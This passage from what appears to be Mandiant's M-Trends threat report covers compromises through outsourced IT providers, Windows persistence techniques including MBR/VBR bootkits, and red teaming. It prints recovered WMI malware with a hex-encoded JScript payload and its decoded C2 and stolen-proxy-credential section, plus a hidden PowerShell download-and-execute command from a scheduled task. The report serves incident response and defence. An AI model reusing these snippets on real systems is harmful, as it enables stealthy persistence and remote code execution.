Verification: Periodically\ncheck running configurations on\nnetworking devices and ensure that\nthey conform to the boot image. Threat\nattackers might compromise the running\nimage of a networking device with\nmodifications that may not persist after\nrebooting.\n\n\n\n- Change Management: Ensure that\nnetwork administrators keep detailed\nlogs on changes made to the networking\ndevice infrastructure. Organizations can\naccomplish this by establishing a change\nmanagement process and implementing a\nchange ticketing system.\n\n- Patch Management: Ensure that devices\nare running with the vendor’s latest\npatches. Always download patches\ndirectly from the vendor and verify hashes\nor digital signatures of the patches before\napplying them to devices.\n\n- Recovery: Store known-good\nconfigurations in a secure location so\nthat they can be used to recover from\na compromise. Periodically check the\nimages installed on networking devices to\ndetermine if the image on a networking\ndevice has been altered.\n\n- Monitoring: Maintain awareness of devices\nwith performance issues that may be\nevidence of compromise.\n\n\n-----\n\n###### A LOOK BACK, TRENDS TURNED CONSTANTS:\n OUTSOURCED SERVICE PROVIDER ABUSE\n\nMandiant continued to observe advanced\nattack groups leveraging outsourced service\nproviders to intrude onto the networks of\nour customers. This topic should sound\nfamiliar; in 2013, Mandiant’s M-Trends report[2]\nincluded an article and case study about\nhow advanced attack groups were observed\nincreasingly taking advantage of outsourcing\nrelationships in order to gain access to\ncompanies that employed those services.\nThis trend has grown, and is possibly more\nprevalent today as an rising number of\norganizations become increasingly reliant on\ntheir outsourced service providers.\n\n2 M-Trends 2013 (https://dl.mandiant.com/EE/library/M-Trends_2013.pdf)\n\n\n-----\n\nCompromise via outsourced service provider (OSP)\n\n###### OSP has access to client network through site-to-site VPN tunnel. Limited access restrictions are in place.\n 1\n\nOutsource Service Provider\n\n###### Attacker compromises OSP\n 2\n\n Attacker leverages site-to-site VPN tunnel and compromises client from OSP network. 3\n\n|Col1|Col2|\n|---|---|\n|M|IS E|\n|M P R O||\n|||\n\n\n###### The Takeaway\n\nYour network is only as secure as your outsourced service provider. Make sure your organization understands the\nsecurity of these providers, and apply as stringent policies to their access as you would to your own employees.\n\n\n-----\n\nOutsourced service provider abuse was\nobserved in several forms throughout 2015.\nWe investigated cases involving financially\nmotivated attackers leveraging stolen\ncredentials from third-party service providers\nto access retail and hospitality networks and\nsteal payment card data, a continuing trend\nthat has been widely reported over the last\nfew years and has not shown any signs of\ndecreasing.\n\nWe also witnessed attackers indirectly\nleveraging outsourced service providers for\naccess by stealing credentials left behind in\nunsecured files on victim systems. While it is\ntrue that the attacker already had access to\nthe victim environment, it was the outsourced\nservice provider credentials that allowed the\nattacker to interact with the target segment\nof the victim’s environment. In one case we\nworked, the attacker found a spreadsheet\nwith usernames and passwords to a protected\nnetwork segment. Unfortunately, this\nprotected network segment allowed remote\nsingle-factor access to the environment. The\nattacker simply leveraged the credentials they\nhad stolen to authenticate to the segmented\nenvironment, accessed systems processing\ncardholder data, and continuously harvested\nthat data until we contained the incident.\n\nThe most damaging outsourced service\nprovider abuses we saw this past year were\nrelated to the IT outsourcing (ITO) industry.\nBy working with victim organizations and\ntheir outsourced IT service providers, we\nhave identified multiple advanced attack\ngroups that have persisted across various\nITO infrastructures for more than at least two\nyears – and five years in one instance. The\nattackers were maintaining persistence to the\nITOs and leveraging them for unrestrained\naccess into the targeted companies that\nemploy the outsourced services. The goals\nof the attackers varied for each of the endclient victims, but the actors were primarily\nfocused on stealing sensitive data from those\norganizations while maintaining access to the\nITO infrastructure for additional campaigns\ntargeting other companies.\n\n\nOur investigations revealed that attackers\nwere maintaining access to the ITOs by\ngaining access to the ITO management servers\nthat these service providers use to support\ntheir clients’ infrastructure. From there, the\nattackers performed reconnaissance and\nharvested credentials that enabled them to\naccess the targeted companies’ systems. The\nattackers occasionally deployed malware\ninside the end-client (victim) networks as\nan additional persistence mechanism, but\nprimarily leveraged the elevated privileges of\nthe ITO administrators to move throughout\nthe victim networks undetected.\n\nIn a recent investigation, Mandiant identified\nan attacker leveraging WMI[3] malware for\npersistence that spanned the ITO network\nalong with multiple victim organizations. The\nusage of WMI for persistence is considered\nan interesting technique and advanced\nattackers are increasingly favoring it, so\nidentifying its usage in ITO investigations\nmarks the convergence of two trends. Last\nyear, Mandiant’s M-Trends report provided\nan overview of WMI and how attackers were\nobserved leveraging this technique for lateral\nmovement and persistence. Additionally,\nIn August 2015[4], the FireEye FLARE team\npublished a whitepaper that dives deep into\nthe architecture of WMI, reveals case studies of\nattacker use of WMI in the wild, describes WMI\nattack mitigation strategies, and shows how to\nmine its repository for forensic artifacts.\n\nThis particular malware was unique not only\nbecause it was WMI-based, but also because\nit leveraged a dead-drop resolver technique\nthat communicated with malicious profiles\ncreated on the Microsoft TechNet web portal;\na technique that FireEye described in a threat\nintelligence report published in May 2015\n[(Hiding in Plain Sight: FireEye and Microsoft](https://www.fireeye.com/blog/threat-research/2015/05/hiding_in_plain_sigh.html)\n_[Expose Chinese APT Group’s Obfuscation](https://www.fireeye.com/blog/threat-research/2015/05/hiding_in_plain_sigh.html)_\n_[Tactic).](https://www.fireeye.com/blog/threat-research/2015/05/hiding_in_plain_sigh.html)_\n\n\n3 M-Trends 2015 – Overview of WMI (https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf)\n\n4 Windows Management Instrumentation (WMI) Offense, Defense, and Forensics (https://www.fireeye.com/blog/\nthreat-research/2015/08/windows managementi.html)\n\n\n-----\n\nAdvanced threat actors can use WMI for nearly every phase of the Targeted Attack Lifecycle.\nBy default, using WMI leaves little evidence for forensic investigators to find, unless they know\nwhere to look. In this particular instance, not only was WMI used to defeat traditional antivirus\nsoftware, it was also used to bypass the victim’s web proxy by using hard-coded credentials\nthat had been stolen from an ITO user. The following code snippet depicts an example of WMI\nmalware recovered from a recent ITO investigation.\n\n\ninstance of ActiveScriptEventConsumer as $Consumer\n{\nName = “MST.ConsumerScripts”;\nScriptingEngine = “JScript”;\nScriptText = “oFS = new ActiveXObject(‘Scripting.FileSystemObject’);JF=’C:/Windows/Temp/%Mutex%’;oMutexFile =\nnull;try{oMutexFile = oFS.OpenTextFile(JF, 2, true);}catch(e){}”\n“CoreCode = ‘ %6D%61%73%74%65%72%55%72%6C%20%3D%20%5B%27%68%74%74%70%3A%2F%2F%73%6F%63%69%61%6C\n%2E%74%65%63%68%6E%65%74%2E%6D%69%63%72%6F%73%6F%66%74%2E%63%6F%6D%2F%50%72%6F%66%69%6C%65%2F%3C%52%45%44%41%43%\n54%45%44%3E%27%5D%3B%20%76%61%72%20%50%72%6F%78%79%20%3D%20%5B%3C%50%52%4F%58%59%5F%52%45%44%41%43%54%45%44%3E%3\nA%38%30%27%2C%27%3C%49%54%4F%5F%55%53%45%52%3E%27%2C%27%3C%49%54%4F%5F%55%53%45%52%5F%50%41%53%53%57%4F%52%44%3E\n%27%5D%3B%20%63%61%6C%6C%55%72%6C%20%3D%20%27%27%3B%20%76%41%75%74%68%20%3D%20%27%27%3B%20%67%53%6C%65%65%70%20\n%3D%20%31%30%30%30%20%2A%20%36%30%20%2A%20%37%32%3B%20%76%53%6C%65%65%70%20%3D%20%35%30%30%3B%20%58%4D%4C%20%3D%20\n%6E%65%77%20%41%63%74%69%76%65%58%4F%62%6A%65%63%74%28%27%4D%53%58%4D%4C%32%2E%53%65%72%76%65%72%58%4D%4C%48%54\n%54%50%2E%36%2E%30%27%29%3B%20%6F%57%53%20%3D%20%6E%65%77%20%41%63%74%69%76%65%58%4F%62%6A%65%63%74%28%27%57%5\n3%63%72%69%70%74%2E%53%68%65%6C%6C%27%29%3B%20%6F%4E%74%20%3D%20%6E%65%77%20%41%63%74%69%76%65%58%4F%62%6A%65%\n63%74%28%27%57%53%63%72%69%70%74%2E%4E%65%74%77%6F%72%6B%27%29%3B%20%6C%6F%63%61%74%6F%72%20%3D%20%6E%65%77%20\n%41%63%74%69%76%65%58%4F%62%6A%65%63%74%28%27%57%62%65%6D%53%63%72%69%70%74%69%6E%67%2E%53%57%62%65%6D%4C%6F%63%­\n61%74%6F%72%27%29%3B%20%6F%57%4D%49%20%3D%20%6C%6F%63%61%74%6F%72%2E%43%6F%6E%6E%65%63%74%53%65%72%76%65%72%28%27%\n2E%27%2C%20%27%72%6F%6F%74%5C%5C%63%69%6D%76%32%27%29%3B%20%6F%46%53%20%3D%20%6E%65%77%20%41%63%74%69%76%65%58%4F6\n%26%A6%56%37%42%82%75%36%37%26%97%07%46%96E%67%2E%46%69%6C%65%53%79%73%74%65%6D%4F%62%6A%65%63%74%27%29%3B%20\n%76%61%72%20%42%61%73%65%36%34%20%3D%20%7B%20%5F%6B%65%79%53%74%72%20%3A%20%22%41%42%43%44%45%46%47%48%49%4A%4B%4C%\n4D%4E%4F%50%51%52%53%54%55%56%57%58%59%5A%61%62%63%64%65%66%67%68%69%6A%6B%6C%6D%6E%6F%70%71%72%73%74%75%76%77%\n78%79%7A%30%31%32%33%34%35%36%37%38%39%2B%2F%3D%22%2C%20%65%6E%63%6F%64%65%20%3A%20%66%75%6E%63%74%69%6F%6E%20\n%28%69%6E%70%75%74%29%20%7B%20%76%61%72%20%6F%75%74%70%75%74%20%3D%20%22%22%3B%20%76%61%72%20%63%68%72%31%2C%20\n%63%68%72%32%2C%20%63%68%72%33%2C%20%65%6E%63%31%2C%20%65%6E%63%32%2C%20%65%6E%63%33%2C%20%65%6E%63%34%3B%20%76%61%7­\n2%20%69%20%3D%20%30%3B%20%69%6E%70%75%74%20%3D%20%42%61%73%65%36%34%2E%5F%75%74%66%38%5F%65%6E%63%6F%64%65%28%69%6E\n%70%75%74%29%3B%20%77%68%69%6C%65%20%28%69%20%3C%20%69%6E%70%75%74%2E%6C%65%6E%67%74%68%29%20%7B%20%63%68%72%31%20\n%3D%20%69%6E%70%75%74%2E%63%68%61%72%43%6F%64%65%41%74%28%69%2B%2B%29%3B%20%63%68%72%32%20%3D%20%69%6E%70%75%74%2E%63\n%68%61%72%43%6F%64%65%41%74%28%69%2B%2B%29%3B%20%63%68%72%33%20%3D\n\n\nThe hex encoded portion of the script in this file decoded to the text shown below. This encoded\ntext contained the URL from which the malware downloaded commands and a hard-coded\nvictim proxy address with authentication credentials that had been stolen from the ITO.\n\n\nmasterUrl = [‘http://social.technet.microsoft.com/Profile/<REDACTED>’]; var Proxy = [<PROXY_REDACTED>:80’,’<ITO_US­\nER>’,’<ITO_USER_PASSWORD>’]; callUrl = ‘’; vAuth = ‘’; gSleep = 1000 * 60 * 72; vSleep = 500; XML = new ActiveXOb­\nject(‘MSXML2.ServerXMLHTTP.6.0’); oWS = new ActiveXObject(‘WScript.Shell’); oNt = new ActiveXObject(‘WScript.Net­\nwork’); locator = new ActiveXObject(‘WbemScripting.SWbemLocator’); oWMI = locator.ConnectServer(‘.’, ‘root\\\\cimv2’);\noFS = new ActiveXObject(‘Scripting.FileSystemObject’); var Base64 = { _keyStr : “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi­\njklmnopqrstuvwxyz0123456789+/=”, encode : function (input) { var output = “”; var chr1, chr2, chr3, enc1, enc2, enc3,\nenc4; var i = 0; input = Base64._utf8_encode(input); while (i < input.length) { chr1 = input.charCodeAt(i++); chr2 =\ninput.charCodeAt(i++); chr3 =\n\n\n-----\n\nThe following diagram depicts how advanced attack groups maintain\ntheir persistence inside ITO infrastructure.\n\nFigure 2 – Attack Diagram\n\nThreat Actor\n\nBackdoor\n\nITO DMZ\n\nHijacked ITO\nAdmin Account\n\nCompany A Company B Company C\n\nCompromised Host Compromised Host Compromised Host\n\nSensitive data Sensitive data WMI Remote\naccess Trojan\n\n\nMicrosoft TechNet C2\n\n\n-----\n\nFigure 3 – Targeted Attack Lifecycle\n\nThis trend of ITO service provider\ncompromise is significant because\nit allows advanced attack groups\nto shortcut the Targeted Attack\nLifecycle. When an attacker infiltrates\na targeted company’s network using\nthe compromised ITO infrastructure,\nthey have essentially skipped the first\nthree phases of the lifecycle. There’s no\nneed to craft an exploit or send a spear\nphishing email to the target company\nsince they already have elevated\nprivileges with unrestricted access. This\nshortcut allows the attackers to scale,\nimproving efficiency and reducing efforts\nrequired to complete their missions.\nCompromising ITO service providers and\nskipping multiple phases of the Targeted\nAttack Lifecycle makes it increasingly\ndifficult for attackers to be prevented\nor detected. We expect this trend to\ncontinue until the cost of operating\nthrough outsourced service providers\nbecomes too great for the attack groups\nto bear. Then they will find an easier\nmethod to accomplish their goals.\n\nRecommendations\n\nHistorically, large enterprises have\nbeen wary about migrating their IT\ninfrastructure to the public cloud because\nof perceived security risks. As we’re\nseeing in our investigations, the risks\nassociated with outsourcing IT services\nmay be just as concerning. Consider the\nfollowing recommendations if you are\nengaging, or have already engaged, an\noutsourced IT service provider.\n\nImplement Multi-Factor Authentication\n& Jump Servers\nImplement multi-factor authentication\nmechanisms for all outsourced service\n\n\nproviders and, where possible, via jump\nserver for service providers to access\na client network environment. If an\nattacker is active inside an outsourced\nservice provider’s network, multi-factor\nauthentication with a dedicated jump\nserver can prevent them from being\nable to steal credentials and pivot\ndirectly into the end-client’s (victim)\nnetworks. Furthermore, any chosen\nmulti-factor solution should be tied to a\ncorresponding user’s Active Directory\naccount and not be valid for other\naccounts. Hardware-based tokens or\nphone-based tokens (such as those\ndelivered via SMS) are more secure\noptions for multi-factor authentication.\nBe sure to actively monitor remote\nlogons for any suspicious activity.\n\nMonitor Use of Privileged Accounts\nMonitor the use of privileged\naccounts, including those associated\nwith outsourced service providers.\nAttackers target privileged accounts\nsuch as local administrator, domain\nadministrator, and service accounts.\nThese are especially valuable inside\nthe ITO management systems since\nthey can potentially be used across\nmultiple clients/victims. While there are\nvarious products/solutions available to\nhelp manage and monitor privileged\naccounts, organizations may consider\nsomething as simple as sending a daily\nreport to all privileged account holders\nshowing where they authenticated\nto, enabling astute administrators to\nidentify suspicious activity.\n\nTotal Cost of Ownership\nAs companies evaluate leveraging\noutsourced service providers, they\n\n\ntypically evaluate the Total Cost\nof Ownership (TCO) in order to\ndetermine the cost-benefit analysis of\noutsourcing. As companies evaluate\nTCO, it’s imperative that they know what\ntypes of network security measures\nthird-party service providers are\ndelivering and how they’re executing\non defending their own infrastructure\nfrom determined adversaries. Ensure\nthey are employing both host-based\nand network-based detection and\nresponse mechanisms. Validate that\nthey are actively monitoring systems\nfor indicators of compromise and that\nthey are responding accordingly. Factor\nin the costs of data breaches into your\nTCO model.\n\nIncident Response Plan\nEnsure your incident response plan\nincludes instructions on how to engage\nwith your outsourced service providers\nduring an incident. In particular, ITOs\ntypically have robust change control\nprocedures. Establish a defined process\nto efficiently navigate those change\ncontrols during a breach so that\nyour incident responders can be as\nnimble as the adversary. Engage legal\ncounsel to help manage risks during\nan incident, but carefully consider the\ncommunications with the ITO on legal\nmatters – such as assigning blame for\nthe breach during incident response\n– to avoid negatively impacting\ncooperation from the people that\nmanage your infrastructure. Counsel\nwill help balance legal considerations\nwith maintaining a positive working\nrelationship with the outsourced service\nprovider in order to ensure an incident\nis revolved quickly and effectively\n\n\n-----\n\n###### A LOOK BACK,\n TRENDS TURNED CONSTANTS: WINDOWS PERSISTENCE\n\n\n-----\n\nMandiant has tracked the most sophisticated\nthreat actors over a span of more than 10\nyears, and this experience has provided a\nunique insight into the evolution of threat\nactors’ tools, tactics, and procedures\n(TTPs). One area of particular interest\nis the persistence mechanisms threat\nactors use to ensure their malware runs\nafter a compromised system is restarted.\nUnderstanding how malware maintains\npersistence provides investigators with\nexcellent indicators of compromise (IOC)\nthat can be used to identify additional\ncompromised systems.\n\n\nHistorically, Mandiant has seen a large\nassortment of malware persistence techniques\nthat typically favored stability and simplicity\nover stealth. The most simplistic persistence\ntechniques involved creating or modifying a\nWindows service or adding malicious files to\nregistry run keys. Table 1 contains a sample\nof common persistence techniques that\nMandiant has identified and written about in\nprevious M-Trends reports.\n\n\nTable 1: Common historically identified persistence mechanisms\n\n|PERSISTENCE MECHANISM|DESCRIPTION|\n|---|---|\n|Windows services Windows Registry DLL search order hijacking Modification of Group Policy Objects (GPO) Use of Common Object Model (COM) objects Modification of existing system binaries Windows scheduled tasks Windows Management Instrumentation (WMI) Malicious Windows Security Packages|A Windows service is a program that is configured to start at system boot time and run in the background. Attackers will often create a new Windows service or hijack an existing one to maintain persistence. The Windows Registry offers countless ways to ensure files are executed on system startup. Through exploitation of the Dynamic-Link Library search order, malicious files with a specific name and location can be loaded by legitimate, vulnerable applications. Threat actors can instruct the system to start malware when a user logs onto the system through the modification of GPOs that manage user logons. COM objects provide a mechanism for applications to communicate and interact with each other. By hijacking COM objects, malware can be loaded when another application attempts to interact with the COM object. Threat actors can modify existing legitimate system binaries to include malicious code that launches malware yet still operates as intended. Threat actors can leverage Windows scheduled tasks to ensure the execution of malicious files based on system triggers such as a specific time or system startup. WMI provides a framework that can trigger applications to run based on changes to the state of specified objects. Similar to scheduled tasks, this can included a specific time or at system startup. Windows security packages are a set of DLLs that Windows Local Security Authority (LSA) will load on system startup. A threat actor can add a malicious security package to persist across system restarts.|\n\n\n-----\n\nLatest Persistence Mechanisms\n\nWhile the tried and true methods of\npersistence continue to provide malware\nauthors the stability they desire, threat\nactors continue to develop new persistence\ntechniques that focus on stealth and\nobfuscation. The following are just a few of\nthe interesting persistence techniques that\nMandiant has identified during investigations\nlast year.\n\nMaster Boot Record (MBR) and Volume Boot\nRecord (VBR) Bootkits\nLast year Mandiant observed threat actors\nmodify the Master Boot Record (MBR) and the\nVolume Boot Record (VBR) so that malicious\ncode executes before the operating system\nis even loaded. This technique is known as\ncreating a “bootkit.” On a Windows system,\nthe MBR stores information on how the\npartitions, which contain the file systems, are\norganized on the drive. The MBR identifies\nthe active partitions on the disk and passes\ncontrol over to the VBR. The VBR contains\ncode that loads the Operating System. Figure\n1 presents a simplified version of the boot\nprocess.\n\nFigure 1: Simplified boot process\n\n\nMBR Bootkit\nOne MBR bootkit that Mandiant identified,\nknown internally as RockBoot, specifically\ntargets Windows XP, Windows Server 2003,\nWindows 7, and Windows 2008/2012 operating\nsystems. The MBR bootkit works by hijacking\nthe boot process when the BIOS passes\ncontrol over to the MBR. This helps circumvent\ntraditional detection and prevention techniques\nsince most technologies do not look at the MBR.\nThe threat actor installs the MBR bootkit with a\n64-bit packed executable. When executing the\nMBR bootkit installer, the threat actor provides\nthe file name for a backdoor that they want\nto remain persistent across system reboots.\nThe installer then drops a driver on disk, which\nprovides the attacker raw read-and-write access\nto the disk. Ultimately, achieving this level of\ndisk manipulation allows the attacker to the\ninstall the MBR bootkit. During the installation,\nthe malware iterates over all logical drives that\nare formatted with NTFS and attempts to store\nan encoded version of the backdoor, listed on\nthe command line, in two places – one as a file\non disk and another in unallocated sectors near\nthe end of the file system. The backdoor stored\nin unallocated sectors serves as a backup in the\nevent the file present on disk is removed.\n\n|1 MBR|Col2|Col3|2 VBR|Col5|Col6|Col7|Partition 0|Unallocated Spaced|\n|---|---|---|---|---|---|---|---|---|\n\n\n-----\n\nThe installer confirms that both copies of the\nbackdoor are stored on disk, and then proceeds\nto install the modified MBR. The installer first\nmakes an encoded copy of the legitimate\nMBR and writes it to unallocated space on the\nphysical drive. The installer then copies sections\nof the malicious MBR over the legitimate MBR,\npreserving the original partition table and error\nmessages. The malware ensures that the MBR is\nonly modified on the physical drive that contains\nthe file system where %WinDir% (indicative\nof where the Windows operating system is\ninstalled) is located and that the MBR has not\npreviously been modified.\n\nFour Stages of Execution\nUpon installation of the MBR bootkit, the\nfollowing four stages of execution occur upon\neach subsequent reboot:\n\n- Stage 1 – Malicious MBR: The Windows\nBIOS loads the modified MBR, which then\nloads the code in stage 2.\n\n- Stage 2 – Initial Loader: Loads the stage 3\ncode that was previously stored as a file\non disk and in unallocated clusters.\n\nFigure 2: Simplified MBR bootkit execution\n\n\n\n- Stage 3 – Secondary Loader: Loads\ncode that enables the installation and\nconfiguration of the backdoor. The stage\n3 code hijacks a preexisting Windows\nservice by overwriting the service name\nwith the location of the backdoor to\nensure the backdoor loads when the\nOperating System starts. At the end\nof stage 3, control is passed back to\nthe legitimate MBR, which allows the\nOperating System to boot.\n\n- Stage 4 – Backdoor Loader: Loads the\nbackdoor from disk. The stage 4 code also\nreplaces the hijacked Windows service\nback to its original state and loads the\nlegitimate service as expected.\n\nFigure 2 provides a simplified explanation of\nthe boot order with the MBR bootkit.\n\n|1 3 Bootkit|2|4 MBR|Col4|VBR|Col6|Partition 0 Operating System|Unallocated Spaced|\n|---|---|---|---|---|---|---|---|\n\n\n-----\n\nVBR Bootkit\nMandiant has identified targeted\nfinancial threat actors using a VBR\nbootkit to maintain persistence.\nMandiant refers to the bootkit as\nBOOTRASH. Similar to the MBR\nbootkit, the VBR bootkit targets\nWindows XP, Server 2003, Windows\n7, and Windows 2008/2012 operating\nsystems. During the installation of the\nVBR bootkit, the installer performs the\nfollowing actions:\n\n1. System Check – The installer\ngathers information on\nthe operating system and\narchitecture in preparation for\ninstallation. This includes checking\nwhether an installer is already\nrunning and determining if the\nMicrosoft .NET 3.5 framework is\ninstalled, a requirement for the\nbackdoor.\n\nFigure 3: Simplified VBR bootkit execution\n\n\n2. Available Space Calculations\nand Virtual File System Creation\n– The installer calculates and\nidentifies free space between\npartitions on the disk that will\nfit the creation of a Virtual File\nSystem (VFS), which will store the\nbackdoor components.\n3. Boot Sector Hijacking – The\ninstaller places an encoded\nbackup copy of the VBR on the\ndisk. The installer then overwrites\nthe legitimate VBR to hijack the\nboot process on subsequent\nsystem starts.\n4. Backdoor Component Installation\n– The installer places backdoor\ncomponents responsible for\ncreating and installing the\nbootkit in the VFS. Additional\nbackdoor components can\nbe saved in either the VFS or\nbe stored as binary data in\n\n\nthe Windows registry. These\nadditional components contain\nthe core command and control\nfunctionality.\n\nAfter the VBR bootkit is installed,\nsubsequent reboots of the system\nload the malicious VBR code that then\nloads the backdoor. This occurs in the\nfollowing fashion:\n\n1. The MBR loads the malicious VBR.\n2. The overwritten VBR loads\nbackdoor code from the VFS.\n3. The overwritten VBR passes\ncontrol to the copy of the\nlegitimate VBS, which continues\nthe boot process.\n4. The operating system boots and\nthe backdoor is operational.\n\nFigure 3 shows a simplified explanation\nof the boot order with the VBR bootkit.\n\n|1 MBR|Col2|Col3|2 3 Boot Kit VBR|Col5|Col6|Col7|4 Partition 0|VFS Unallocated Spaced|\n|---|---|---|---|---|---|---|---|---|\n\n\n-----\n\nChaining Persistence to Avoid\nDetection\nIn an effort to hide, attackers\nhave begun chaining persistence\ntechniques. Chaining persistence\ntechniques involves using a multi-step\napproach to separate the execution\nof malware into separate stages.\nThe idea is to make the first link in\nthe chain appear to be benign or\ninnocuous so investigators mistake\nit for being legitimate. Yet, when\nyou follow the chain further and\nbegin putting the additional pieces\ntogether, the full picture comes into\nfocus and the execution chain ends\nwith the execution of the threat\nactor’s malware. The following section\noutlines how attackers are using\nWindows scheduled tasks as the initial\nchain that leads to more sophisticated\nmethods of malware execution.\n\nWindows Scheduled Tasks\nWindows scheduled tasks allow for\nthe automation of tasks on systems.\nThe Windows Task Scheduler\nmonitors the system for specific\ncriteria, often a specific time or event\nsuch as a system startup or user\nlogon. When the condition is met, the\nTask Scheduler executes a predefined\n\n\naction. Used legitimately, this allows\nfor daily administrative tasks to\nbe accomplished such as system\nmaintenance. Used maliciously, it\nallows for the execution of files or for\nmaintaining persistence.\n\nHistorically, attackers have used\nWindows scheduled tasks in a\nstraightforward fashion. The most\npopular ways advanced attackers\nleverage scheduled tasks are onetime file execution and persistent\nmalware execution. With one-time\nfile execution, threat actors create a\nWindows scheduled task to execute a\nutility or backdoor installer one time.\nFor persistent malware execution,\nthreat actors can schedule malware\nto execute at predefined times to\nmaintain persistence – it can be a\ndaily occurrence or only on certain\ndays.\n\nThese use cases provide a consistent\nmethod for attackers to persistently\nexecute malware. More recently, we\nobserved threat actors expanding\ntheir use of Windows scheduled\ntasks by introducing an additional\nlevel of complexity to the execution\n\n\nchain. Rather than simply creating a\nnew Windows scheduled task and\nexecuting a malicious file, threat\nactors are leveraging legitimate\nWindows utilities to download and\nexecute malicious files. While this\ntechnique has been possible for years,\nattackers starting to put additional\nemphasis on stealth in an attempt to\nstay hidden.\n\nOne such attacker method we\nobserved is through the scheduled\ndaily execution of PowerShell\ncommands. The commands are\nconfigured to contact a command and\ncontrol server and download malicious\ncode. The code remains resident in\nmemory and runs under a PowerShell\nprocess. At no point is the malicious\ncode placed on disk – the only\nindication of evil is in the PowerShell\ncommand line arguments configured\nwithin the Windows scheduled task.\nFigure 4 contains an excerpt from\nthe Windows scheduled task file\nthat contained the configuration to\nexecute PowerShell.\n\n\nFigure 4: PowerShell command from a Windows scheduled task file\n\n\n<Actions Context=”Author”>\n<Exec>\n<Command>powershell</Command>\n<Arguments>-w hidden -nologo -noninteractive -nop -ep bypass -c “IEX ((new-object net.webclient).download­\nstring(“”https://REDACTED”””))”\n</Arguments>\n</Exec>\n</Actions>\n\n\n-----\n\nAn added benefit of this approach is that because the persistence\nmechanism reaches out to the command and control server to pull\ndown the malicious code, the attacker can update the code at will. In\nthe instances we observed, the malicious code may communicate with\na different command and control server every day, or do nothing at all.\nFigure 5 contains an example of this persistence technique.\n\nFigure 5: Windows scheduled task and PowerShell persistence\n\n\n-----\n\nAnother technique we observed was the use of a Windows scheduled\ntask that threat actors configured to execute a Windows shortcut, known\nas a LNK file. The threat actor created a LNK file that called PowerShell\nwith a command line argument to inject shellcode into an otherwise\nbenign Windows process. In the cases we worked, the threat actor would\nstore the shellcode that provided backdoor functionality on disk. Figure 6\ncontains an example of how the LNK file persistence works.\n\nFigure 6: Windows scheduled task and LNK file persistence\n\n###### 1. The Windows scheduled task runs when the system boots.\n\nThe scheduled task runs a\nWindows LNK file that the\nthreat actor created\n\n###### 2. The Windows LNK is configured to execute PowerShell. PowerShell command arguments supplied\n\nin the LNK file instruct PowerShell to read shellcode\nfrom a file present on disk and then injects the\nshellcode into the PowerShell process.\n\n###### 3. The shellcode contains backdoor code that begins communicating with the\nattacker C2 server.\n\nVICTIM\nSYSTEM\n\nConclusion\n\nWhile the use of tried and true methods for malware persistence\nremain rampant, malware authors continue to find new and innovative\ntechniques. Threat actors will continue to burrow deeper into systems,\nin some cases going below the underlying operating system, in an\nattempt to avoid detection and counter eradication attempts. As\ninvestigators, it is imperative for us to understand malware persistence\ntechniques as they serve as a focal point for the investigation and help\ndrive a successful remediation.\n\n\n-----\n\n## THE [re]RISE\n OF RED TEAMING\n\n\nIntroduction\n\nFor years, our community has\nrecognized the value of security\ntesting as a way to proactively\nidentify and remediate vulnerabilities\nbefore an attacker can exploit\nthem. Many of the companies\nengaged by Mandiant in 2015 have\ninternal capabilities for vulnerability\nassessments and security testing, or\nhave outsourced those capabilities to\nspecialized firms – or they maintain\na blend of both. These programs\n\n\ntypically consist of automated\nscanning, manual analysis by\ntrained professionals using proven\nmethodologies, and even exploitation\nof known vulnerabilities in order to\ndemonstrate how an organization\ncan be impacted. Ideally, for each\ntest performed and vulnerability\nremediated, the “Security Gap” gets\nsmaller.\n\nHowever, there is no such thing as\nperfect security, and the “Security\nGap” will never be completely\n\n\neliminated. Additionally, security\nassessment results are only valid\nif the environment never changes,\nwhich is unrealistic. There will\nalways be uncertainty. No amount\nof vulnerability testing will be able\nto predict a patient human attacker,\none who will invariably find a way\nto exploit a gap and breach an\nenvironment. Therefore, instead of\nfocusing only on identifying and\nremediating vulnerabilities, many\norganizations have turned back to an\n\n\n-----\n\nolder testing paradigm favored by\nthe military and government – Red\nTeaming (also known as: war gaming,\nadvanced threat simulation, etc).\n\nMandiant has observed an increased\ninterest among our clients for\ntargeted testing and threat\nsimulations designed to emulate realworld advanced attacks. Beyond the\ncapabilities of traditional vulnerability\nassessments and penetration tests,\nthese “Red Team” events can answer\nthe following questions:\n\n\n###### 1\n\n\n###### How well does the security program protect the critical assets (data, systems, and people) that truly matter to the organization?\n\n\n###### How effective and efficient are the security teams at detecting targeted threat activity, recognizing the severity of the threat, and responding properly\n 2\n to protect critical assets and data?\n\n What gaps in the security program have been overlooked or ignored?\n 3\n\n\n###### 4\n\n\n###### Are you prepared to deal with a worst case hacking scenario?\n\n\nWhen conducted properly, a Red Team engagement is an indispensable\ntool for enhancing detection and response capabilities, and evaluating and\nexercising a security program in a way that supplements traditional security\ntesting methods.\n\n\n-----\n\nOn Definitions\n\nWe recognize that there are no universally accepted definitions for the terms “vulnerability assessment,”\n“penetration test,” and “Red Team.” Some companies purchase annual “penetration tests” consisting of\nnothing more than an automated vulnerability scan using a commercial tool. Other companies regularly\nengage in “penetration tests” that include social engineering campaigns, customized malware, and\ntargeted attempts to compromise critical business systems.\n\nOur intent is not to incite a definition debate; however, in order to avoid ambiguity, we submit the\nfollowing definitions in the context of cybersecurity testing:\n\n\nVulnerability assessment:\nStructured testing designed to\nholistically identify the security\nflaws in a system, application,\nor environment. Leverages\nproven testing methodologies in\nattempt to identify all potential\nvulnerabilities. Can include both\nmanual and automated testing.\n\nPenetration test: Testing of a\nparticular system, application,\nor environment for the purpose\nof accomplishing an adversarial\nobjective. In contrast to a\nvulnerability assessment, this\ntype of testing is not designed\nto be holistic; rather, the tester is\nattempting to find vulnerabilities\n\nRed Team operation: Attack\nemulation using precision,\ncreative thinking, and the\nTTPs of an advanced and\nmotivated adversary in order\nto accomplish a meaningful\nobjective against the target\nenvironment. Typically\nconducted outside the\nknowledge of the IT and\nsecurity teams, the Red Team\ncreates a realistic attack\nscenario based on emerging\nthreats that both identifies\nsecurity gaps and gauges an\norganization’s ability to detect\n\n\nExample: A technical\nassessment of the user interface,\ncompiled code, configuration,\nand network communication of\nthe iOS and Android versions\nof a mobile application prior to\npublic release.\n\nthat can be leveraged to\naccomplish something that\nan adversary would also do.\nCan include both manual and\nautomated testing, but is\ndependent on a human tester to\ntake advantage of exploitable\nweaknesses and accomplish the\nend objective.\n\nand respond to an advanced\nthreat actor.\n\nExample: The CIO of a major\nmanufacturer engaged Mandiant\nvia a third party. His request:\n“Break in” to his organization 